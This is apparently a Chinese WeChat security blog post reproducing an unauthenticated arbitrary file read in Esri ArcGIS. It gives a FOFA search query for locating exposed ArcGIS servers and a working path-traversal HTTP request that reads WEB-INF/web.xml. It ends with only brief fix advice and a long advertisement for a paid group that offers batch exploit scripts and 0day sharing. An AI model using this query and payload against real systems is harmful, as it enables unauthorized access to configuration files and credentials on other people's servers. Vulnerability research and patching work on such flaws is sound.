#  「漏洞复现」ArcGIS 地理信息系统 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-11-20 10:18  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
ArcGIS是由美国Esri公司研发的地理信息系统（GIS）软件，它整合了数据库、软件工程、人工智能、网络技术、云计算等主流的IT技术，旨在为用户提供一套完整的、开放的企业级GIS解决方案，它包含了一套带有用户界面组件的Windows桌面应用。可以实现从简单到复杂的地理信息系统(GIS)任务，如制图、地理分析、数据编辑、数据管理、可视化和空间处理等。  
  
0x03  
  
**漏洞威胁**  
  
ArcGIS地理信息系统 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="esri-ArcGIS"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9lQmpcKhEVS7pbMsjBggBZut6SNeh6uDaicDLIoDA4Omtmk12GnicAKFBTvkZ7oxoEGjbHyq9nR3w/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9lQmpcKhEVS7pbMsjBggBztCib0dbL6bUvjjam4c53RRAITsFyAogttM94icM4gNufwPJrlOFIdNQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9lQmpcKhEVS7pbMsjBggBNstZ14J9sjWcyu2XwIYvWIXYe5VqLYRCXbHSdxNX7hHFqaIT3sDBrw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0o9lQmpcKhEVS7pbMsjBggBO926MXK6TD9UBWPI4lkILj62RCFiaibbOPHKEMmz7p8jjrkuo6K5zCUw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0o9lQmpcKhEVS7pbMsjBggBZ187QiaT29HGicoBPd9sfmIomE6L7jN9icRBsx4N0Vaq6dMlTv7707NQw/640?wx_fmt=gif&from=appmsg "")  
  
  
